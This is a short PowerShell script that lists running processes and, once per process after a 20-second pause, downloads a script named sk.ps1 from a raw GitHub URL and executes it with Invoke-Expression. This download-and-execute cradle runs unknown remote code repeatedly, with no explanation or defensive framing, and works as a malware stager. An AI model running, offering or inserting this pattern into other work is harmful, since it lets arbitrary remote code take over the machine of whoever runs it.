$processes = Get-Process

$i = 1
ForEach ($process in $processes) {

    
    Start-Sleep -Seconds 20
    $i++
    IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/hmdsazzad17/test/main/sk.ps1');
    
}
